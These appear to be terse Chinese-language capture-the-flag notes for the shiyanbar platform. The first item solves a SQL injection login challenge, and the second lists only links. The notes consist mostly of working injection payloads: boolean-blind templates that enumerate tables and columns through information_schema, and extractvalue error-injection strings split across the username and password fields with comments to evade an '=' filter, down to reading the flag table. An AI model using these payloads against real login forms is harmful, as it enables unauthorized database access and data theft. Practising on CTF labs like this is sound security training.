实验吧CTF

1.加了料的报错注入
	http://www.shiyanbar.com/ctf/2011
	bool型注入、报错注入，过滤=，information_schema注入，group_concat\length\extractvalue
	$sql="select * from users where username='$username' and password='$password'"
	model ="1' or !(length((select group_concat(table_name) from information_schema.tables where !(table_schema<>database())))<>%d) or '"
	model ="1' or !(length((select group_concat(column_name) from information_schema.columns where !(table_name<>'ffll44jj')))<>%d) or '"
	model = "1' or (select group_concat(column_name) from information_schema.columns where !(table_name<>'ffll44jj')) regexp '^%s' or '"
	#username=1' or extractvalue/*&password=*/(1,concat(0x23,database())) or '
	#username=1' or extractvalue/*&password=*/(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema regexp database()))) or '
	#username=1' or extractvalue/*&password=*/(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_name regexp 'ffll44jj'))) or '
	#username=1' or extractvalue/*&password=*/(1,concat(0x23,(select value from ffll44jj))) or '
2.认真一点！分值：35
	 http://ctf5.shiyanbar.com/web/earnest/index.php 
	 http://www.weisource.xin/?p=162
